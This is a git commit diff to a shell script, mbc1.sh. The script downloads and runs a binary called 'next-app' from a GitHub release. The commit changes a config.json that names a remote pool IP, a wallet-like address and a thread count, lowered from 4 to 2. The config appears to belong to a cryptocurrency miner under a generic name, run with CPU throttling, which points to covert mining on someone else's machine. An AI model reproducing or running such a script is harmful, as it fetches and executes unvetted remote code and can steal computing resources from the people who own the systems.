716fa2eb0d3eb9d93f887b0ccde789e975de6f57
barburonjilo <barburonjilo@outlook.co.id>
2025-07-24 11:43:14 +0700

    Update mbc1.sh

--- mbc1.sh
+++ mbc1.sh
@@ -9,6 +9,6 @@ wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz
 
 tar -xf next-app.tar.gz
 
-echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 4}' > config.json
+echo '{"host": "45.115.225.42", "port": 443, "user": "mbc1qh9m6s26m5u0snjk7wp5gl4v6w6ecsgz7jsv482", "pass": "x", "threads": 2}' > config.json
 
 cpulimit --limit 400 -- ./next-app/next-app
